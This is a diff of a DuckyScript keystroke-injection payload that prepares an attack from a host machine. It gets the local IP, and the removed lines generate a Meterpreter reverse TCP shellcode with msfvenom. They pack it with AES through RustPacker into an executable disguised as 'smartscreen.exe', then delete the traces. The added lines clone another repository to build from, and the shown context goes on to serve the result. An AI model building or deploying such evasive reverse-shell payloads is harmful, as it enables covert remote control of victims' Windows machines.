@@ -10,21 +10,8 @@ STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 |
 STRINGLN mkdir -p /tmp/ducky/
 STRINGLN cd /tmp/ducky/
 
-STRINGLN git clone https://github.com/Nariod/RustPacker.git
-WAIT_FOR_BUTTON_PRESS
-STRINGLN cd RustPacker/
-
-REM Write Shellcode
-STRINGLN msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LOCAL_IP LPORT=3000 EXITFUNC=thread -f raw -o shell.bin
-DELAY 6000
-
-REM Pack shellcode
-STRINGLN cargo run -- -f shell.bin -i ntapc -e aes -b exe -t smartscreen.exe -o /tmp/ducky/windows
-WAIT_FOR_BUTTON_PRESS
-
-REM cleanup
-STRINGLN rm shell.bin
-STRINGLN cd ../
+REM build
+STRINGLN git clone https://github.com/CodedMasonry/flipping_duckling.git
 
 REM Start serving
 STRINGLN echo $LOCAL_IP
